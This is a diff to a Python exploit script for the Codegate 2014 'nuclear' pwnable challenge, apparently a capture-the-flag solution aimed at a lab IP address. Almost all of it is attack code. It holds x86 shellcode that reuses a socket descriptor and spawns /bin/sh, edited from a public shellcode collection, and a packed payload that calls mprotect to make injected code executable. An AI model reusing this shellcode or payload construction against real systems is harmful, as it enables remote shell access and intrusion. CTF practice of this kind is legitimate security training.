@@ -1,5 +1,4 @@
-# Codegate 2014 Junior Pwnable
-# Nuclear
+# Codegate 2014 Junior Pwnable nuclear
 from err0rless import connst, dump
 from struct import pack, unpack
 
@@ -8,10 +7,10 @@ s, t = connst("192.168.95.150", 1129)
 # http://shell-storm.org/shellcode/files/shellcode-881.php
 # delete `dec %eax`, dup(2) -> dup(4)
 sc = ("\x6A\x04\x5B\x6A\x29\x58\xCD\x80\x89\xC6"
-	  "\x31\xC9\x56\x5B\x6A\x3F\x58\xCD\x80\x41\x80"
-	  "\xF9\x03\x75\xF5\x6A\x0B\x58\x99\x52\x31\xF6"
-	  "\x56\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E"
-	  "\x89\xE3\x31\xC9\xCD\x80")
+      "\x31\xC9\x56\x5B\x6A\x3F\x58\xCD\x80\x41\x80"
+      "\xF9\x03\x75\xF5\x6A\x0B\x58\x99\x52\x31\xF6"
+      "\x56\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E"
+      "\x89\xE3\x31\xC9\xCD\x80")
 
 def leakPasscode():
 	print t.read_until("> ")
@@ -60,11 +59,11 @@ def pMain():
 	p += pack("I", len(sc))
 	p += pack("I", 0x00)
 
-	p += pack("I", 0x08048900) # recv.plt
+	p += pack("I", 0x08048900) # mprotect
 	p += pack("I", 0x0804B088)
 	p += pack("I", 0x0804B000)
 	p += pack("I", 0x1000)
-	p += pack("I", 0x07)
+	p += pack("I", 0x04)       # PROT_EXEC
 
 	s.send(p + "\n")
 	mprotect = unpack("I", s.recv(4))[0] - 0xE3CF0
